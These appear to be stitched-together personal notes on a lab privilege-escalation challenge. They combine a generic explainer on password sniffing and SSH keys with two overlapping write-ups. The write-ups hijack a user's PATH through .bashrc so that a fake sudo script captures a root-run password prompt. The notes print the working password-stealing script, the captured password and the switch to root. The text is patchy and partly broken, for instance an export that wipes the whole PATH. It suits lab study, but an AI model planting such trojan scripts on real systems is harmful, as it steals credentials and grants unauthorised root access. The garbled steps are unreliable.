ssh -i ../../mnt/c/Users/User/Downloads/id-rsa-1647296932800.id-rsa frank@10.113.129.88

In the context of networking and Linux security, "eavesdropping" (also called **sniffing** or **snooping**) is the act of a third party secretly "listening" to the data traveling between your computer and the server.

When you use a password to log in, an eavesdropper is looking to capture that specific piece of data. Here is how it works and why it is dangerous:

### 1. How "Listening" Works (Packet Sniffing)

When you send information over a network, it is broken into small "packets." Digital eavesdropping is done using software called a **Packet Sniffer** (like Wireshark or tcpdump).
- **On an unsecure network (like public Wi-Fi):** Anyone on the same network can potentially see every packet you send.
- **The "Listening" Process:** The attacker’s computer is set to "promiscuous mode," which tells it to catch and read every packet flying through the air or wire, not just the ones addressed to them.

### 2. The "Plain Text" Problem (Telnet vs. SSH)

To understand why eavesdropping is a threat to passwords, you have to look at the protocol being used:

- **The Old Way (Telnet/HTTP):** These protocols send data in **Plain Text**. If you type your password, the packet literally contains the characters: P-a-s-s-w-o-r-d-1-2-3. If an attacker is "listening," they see your password exactly as you typed it.
- **The Secure Way (SSH):** SSH stands for **Secure** Shell. It creates an encrypted "tunnel." Even if an attacker intercepts the packets, they will only see scrambled gibberish (e.g., &yX#9!zq...). They can hear the "noise" of the data, but they can't understand it.

### 3. How SSH Keys Prevent Eavesdropping

While standard SSH (with a password) is very secure, using **SSH Keys** provides an even higher level of protection against eavesdropping for two reasons:

1. **The password is never sent:** When you use an SSH key, your computer and the server perform a "cryptographic handshake." Your computer proves it has the private key without actually sending the key (or a password) over the network.
2. **Nothing to "Hear":** Since no password ever travels across the wire, an eavesdropper can "listen" forever and they will never capture a secret they can reuse.

### 4. Other forms of Eavesdropping

Outside of network sniffing, "listening for a password" can also refer to:

- **Keyloggers:** Malware on your computer that "listens" to your actual keyboard strokes and sends them to a hacker.[[6](https://www.google.com/url?sa=E&q=https%3A%2F%2Fvertexaisearch.cloud.google.com%2Fgrounding-api-redirect%2FAUZIYQHMoJgiDMnfe-bVqePuwQCcl1RFQifkvoz2YZg44yDX80Q6BzR05RoCI_dmiHNQw3ZcT2U2HdXE-UcQIkOPmQ2jaTeRCg6wWxOAoRRBV8tXV8QtH62d_7Xa6jLts6UlDj-bv5222_m-d9sdORvhoeuG1LFMFE_geq0yFDAnNy8r9m-Axc1tU9WUBbOtqGhNw_69EXc%3D)]
    
- **Over-the-shoulder:** Literally watching you type (the most basic form of eavesdropping).
    
- **Side-Channel Attacks:** Advanced hackers can sometimes "listen" to the electrical vibrations or sound of your computer's processor to guess what it's doing, though this is rare for average users.
    

**Summary:** When someone says they are "listening for a password," they usually mean they are using software to watch network traffic, hoping you use an insecure connection so they can see your password in plain text. **Using SSH keys makes this attack impossible because the password is never sent in the first place.**

 cat /etc/crontab
cat: /etc/crontab: No such file or directory

Connect to SSH and upload `pspy` as we have to observe what's going on on the system, expecting a root cron job.

```
$ ssh frank@10.10.210.234 -i idrsa.id-rsa
$ scp -i idrsa.id-rsa pspy64 frank@10.10.210.234:pspy
```

Then we make it executable and run it.

```
frank@workstation:~$ chmod +x pspy
frank@workstation:~$ ./pspy
```

Look at the logs:

```
2023/02/04 12:01:55 CMD: UID=1000  PID=1413   | sshd: frank@pts/1
2023/02/04 12:01:56 CMD: UID=1000  PID=1414   | sshd: frank@pts/1
2023/02/04 12:01:57 CMD: UID=1000  PID=1415   | sshd: frank@pts/1
2023/02/04 12:01:58 CMD: UID=1000  PID=1416   | sshd: frank@pts/1
2023/02/04 12:01:58 CMD: UID=1000  PID=1417   | /bin/sh /usr/sbin/service --status-all
2023/02/04 12:01:58 CMD: UID=1000  PID=1418   | /bin/sh /usr/sbin/service --status-all
2023/02/04 12:01:58 CMD: UID=1000  PID=1419   | /bin/sh /usr/sbin/service --status-all
2023/02/04 12:01:58 CMD: UID=1000  PID=1420   | /bin/sh /etc/init.d/dbus status
2023/02/04 12:01:58 CMD: UID=1000  PID=1422   | /bin/sh /usr/sbin/service --status-all
2023/02/04 12:01:58 CMD: UID=1000  PID=1421   | /bin/sh /usr/sbin/service --status-all
2023/02/04 12:01:58 CMD: UID=1000  PID=1423   | /bin/sh /usr/sbin/service --status-all
2023/02/04 12:01:58 CMD: UID=1000  PID=1424   | /bin/sh /etc/init.d/hwclock.sh status
2023/02/04 12:01:58 CMD: UID=1000  PID=1426   | /bin/sh /usr/sbin/service --status-all
2023/02/04 12:01:58 CMD: UID=1000  PID=1425   | /bin/sh /usr/sbin/service --status-all
2023/02/04 12:01:58 CMD: UID=1000  PID=1427   | /bin/sh /usr/sbin/service --status-all
2023/02/04 12:01:58 CMD: UID=1000  PID=1428   | /bin/sh /etc/init.d/procps status
2023/02/04 12:01:58 CMD: UID=1000  PID=1429   | /bin/sh /etc/init.d/procps status
2023/02/04 12:01:58 CMD: UID=1000  PID=1430   | /bin/sh /etc/init.d/procps status
2023/02/04 12:01:58 CMD: UID=1000  PID=1431   | /bin/sh /etc/init.d/procps status
2023/02/04 12:01:58 CMD: UID=1000  PID=1433   | /bin/sh /usr/sbin/service --status-all
2023/02/04 12:01:58 CMD: UID=1000  PID=1432   | /bin/sh /usr/sbin/service --status-all
2023/02/04 12:01:58 CMD: UID=1000  PID=1434   | /bin/sh /usr/sbin/service --status-all
2023/02/04 12:01:58 CMD: UID=1000  PID=1437   | /bin/sh /etc/init.d/ssh status
2023/02/04 12:01:58 CMD: UID=1000  PID=1436   | /bin/sh /etc/init.d/ssh status
2023/02/04 12:01:58 CMD: UID=1000  PID=1435   | /bin/sh /etc/init.d/ssh status
2023/02/04 12:01:58 CMD: UID=1000  PID=1438   | /bin/sh /etc/init.d/ssh status
2023/02/04 12:01:58 CMD: UID=1000  PID=1439   | /bin/sh /etc/init.d/ssh status
2023/02/04 12:01:58 CMD: UID=1000  PID=1440   | /bin/sh /etc/init.d/ssh status
2023/02/04 12:01:58 CMD: UID=1000  PID=1442   | /bin/sh /usr/sbin/service --status-all
2023/02/04 12:01:58 CMD: UID=1000  PID=1441   | /bin/sh /usr/sbin/service --status-all
2023/02/04 12:01:59 CMD: UID=1000  PID=1443   | sshd: frank@pts/1
2023/02/04 12:02:00 CMD: UID=1000  PID=1444   | sshd: frank@pts/1
2023/02/04 12:02:00 CMD: UID=0     PID=1445   | sudo cat /etc/shadow
2023/02/04 12:02:20 CMD: UID=0     PID=1446   | sshd: [accepted]
2023/02/04 12:02:20 CMD: UID=0     PID=1447   | sshd: [accepted]
2023/02/04 12:02:20 CMD: UID=0     PID=1448   | sshd: frank [priv]
2023/02/04 12:02:20 CMD: UID=0     PID=1449   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2023/02/04 12:02:20 CMD: UID=0     PID=1450   | run-parts --lsbsysinit /etc/update-motd.d
2023/02/04 12:02:20 CMD: UID=0     PID=1451   | /bin/sh /etc/update-motd.d/00-header
2023/02/04 12:02:20 CMD: UID=0     PID=1452   | /bin/sh /etc/update-motd.d/00-header
2023/02/04 12:02:20 CMD: UID=0     PID=1453   | /bin/sh /etc/update-motd.d/00-header
2023/02/04 12:02:20 CMD: UID=0     PID=1454   | run-parts --lsbsysinit /etc/update-motd.d
2023/02/04 12:02:20 CMD: UID=0     PID=1455   | run-parts --lsbsysinit /etc/update-motd.d
2023/02/04 12:02:20 CMD: UID=0     PID=1456   | run-parts --lsbsysinit /etc/update-motd.d
2023/02/04 12:02:20 CMD: UID=0     PID=1457   | sshd: frank [priv]
```

This is weird, why root would use sudo? Looks like root is connecting through SSH to frank account. There is probably a cron job executing sudo in a unattended way so we'll be able to capture root password by capturing the intput. To do so we just have to change frank's PATH so a rogue sudo command would be executed.
## Hijack

Another hint from the problem is hijack, so I looked into the problem of path hijack and found that we should be able to create a script called sudo and prepend it to the PATH of the user frank. This way, when the ssh user will run sudo they will run the sudo script that we made.

  
mkdir -p /home/frank/.local/bin/  
vim /home/frank/.local/bin/sudo

Then in the sudo script we add

#!/bin/bash  
read password  
echo $password >> /home/frank/password.txt

Then we have to add it to `.bashrc`

This won’t change the path with the current terminal, so we’ll need to reconnect as Frank for the path to update. Once, we reconnect and and use echo $PATH, we should see the path updated to include our tmp directory.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*_ZU69pxxLCe6x-crYCzpbw.png)

chmod +x /home/frank/.local/bin/sudo  
vim /home/frank/.bashrc

And we put the export at the start of the file (to avoid exits)

export PATH=/home/frank/.local/bin

Then we have to wait and we can display the password using

cat password.txt

Then we can use the `/bin/sudo` binary to run as root. Remember that the `sudo` binary is now our script so we have to specfy the absolute path :)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*hpOO3Tyu4EkiuCKR3y5-aA.png)

Then simply `/bin/sudo bash` and then `cat /root/flag.txt`.

Let's take a step back.

Before the process `cat /etc/shadow`, it'll have to run `sudo` first, which will then prompt a password prompt!

```
2023/02/06 06:46:21 CMD: UID=1000 PID=17382  | sshd: frank@pts/2    
2023/02/06 06:46:21 CMD: UID=0    PID=17383  | sudo cat /etc/shadow
```

Hmm… **Why not just let the password prompt give us the correct password of user `frank`? :D**

To do so, I'll export a new `PATH` environment variable, then create an evil Bash script called `sudo` to read the process's password:

- Export new `PATH` environment variable:

Normally you would do it via the `export` command. This time however, we need to do it in the `.bashrc`, as the process is using SSH to connect into user `frank`.

```
frank@workstation:~$ vi .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
[...]
```

- Create an evil Bash script called `sudo` in `/tmp`:

```
frank@workstation:~$ cd /tmp
frank@workstation:/tmp$ vi sudo 
#!/bin/bash

read -sp '[sudo] password for frank: ' password

echo -e "\n"
echo $password > /tmp/password.txt

frank@workstation:/tmp$ chmod +x sudo
```

- Wait for the process ran:

```shel
2023/02/06 07:27:33 CMD: UID=1000 PID=30507  | sshd: frank@pts/2    
2023/02/06 07:27:34 CMD: UID=0    PID=30509  | sudo cat /etc/shadow
```

```
frank@workstation:~$ cat /tmp/password.txt 
!@#frankisawesome2022%*
```
**Then we can run the real `sudo` command:**

```
frank@workstation:~$ sudo -l
[sudo] password for frank: 
Matching Defaults entries for frank on workstation:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User frank may run the following commands on workstation:
    (ALL : ALL) ALL
```

**Nice! Let's Switch User to root!**

```
frank@workstation:~$ sudo su root
```
